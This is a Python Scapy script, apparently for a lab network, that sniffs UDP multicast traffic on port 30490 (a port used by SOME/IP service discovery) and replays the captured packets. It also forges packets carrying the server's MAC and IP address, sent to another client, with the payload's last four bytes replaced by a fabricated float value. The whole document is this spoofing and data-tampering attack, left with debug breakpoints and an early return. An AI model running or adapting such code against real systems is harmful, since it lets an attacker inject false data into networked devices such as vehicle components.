from scapy.all import *
import pdb
import struct

multicast_group = "239.10.0.1"
multicast_port = 30490

server_ip = "10.0.0.1"
client2_ip = "10.0.0.2"
client3_ip = "10.0.0.3"

client3_mac = getmacbyip(client3_ip)
print(f"client3_mac: {client3_mac}")

def process_packet(packet):
    print("hit !")
    if packet.haslayer(IP) and packet.haslayer(UDP):
        print("UDP packet !")

        #if packet[IP].src == server_ip and packet[IP].dst == client2_ip:
        if packet[IP].src == server_ip and packet[IP].dst == multicast_group:
            #print("10.0.0.3 -> 10.0.0.2 UDP packet !")
            print(f"{server_ip} -> {multicast_group} UDP/Multicast packet!")
            payload_orig = packet[UDP].payload

            for i in range(5):
                sendp(packet, iface="client3-eth0")
            pdb.set_trace()
            return

            '''
            src_mac = "00:00:00:00:00:03"
            dst_mac = "00:00:00:00:00:02"
            eth_layer = Ether(src=src_mac, dst=dst_mac)

            src_ip = "10.0.0.3"
            dst_ip = "10.0.0.2"
            src_port = 32001
            dst_port = 53572
            payload = "123"
            udp_packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=src_port, dport=dst_port) / Raw(load=payload)
            packet = eth_layer / udp_packet
            '''


            #packet_udp = Ether(src='00:00:00:00:00:03', dst='00:00:00:00:00:02')/IP(src="10.0.0.3", dst="10.0.0.2")/UDP(sport=32000, dport=53571)

            # server -> client packet send
            packet_udp = Ether(src='00:00:00:00:00:01', dst='00:00:00:00:00:02')/IP(src="10.0.0.1", dst="10.0.0.2")/UDP(sport=32000, dport=53571)
            payload_orig = bytes(payload_orig)[:-4] + struct.pack("f", 0.123123)
            packet = packet_udp / Raw(load=payload_orig)

            print("send 5 times")
            for i in range(5):
                sendp(packet, iface="client3-eth0")
                #sendp(packet, iface="client3-eth0", loop=1, inter=0.01)
                #send(packet)
            pdb.set_trace()
            #print(f"Modified Payload sent as: {modified_payload}")

#sniff(filter=f"udp and src dst {multicast_group} and src port {multicast_port}", iface='client3-eth0', prn=process_packet)
#sniff(filter=f"udp and src dst {multicast_group}", iface='client3-eth0', prn=process_packet)
sniff(filter=f"udp and dst host {multicast_group} and dst port {multicast_port}", iface='client3-eth0', prn=process_packet)
#sniff(filter=f"udp and src host 10.0.0.3 and src port 32000", iface='client3-eth0', prn=process_packet)
#udp and src host {node1_ip} and src port {node1_port}

